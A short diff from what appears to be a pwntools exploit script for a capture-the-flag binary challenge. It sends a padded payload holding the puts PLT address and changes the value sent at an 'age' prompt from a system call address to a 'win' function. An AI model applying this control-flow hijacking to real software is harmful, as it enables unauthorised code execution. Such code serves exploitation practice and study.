@@ -15,7 +15,7 @@ p.send('AAAABBBBCCCCDDDD' + p64(puts_plt))
 p.recvuntil('>')
 p.sendline('3')
 p.recvuntil('age:')
-p.sendline(str(system_call))
+p.sendline(str(win))
 
 p.recvuntil('>')
 p.sendline('4')
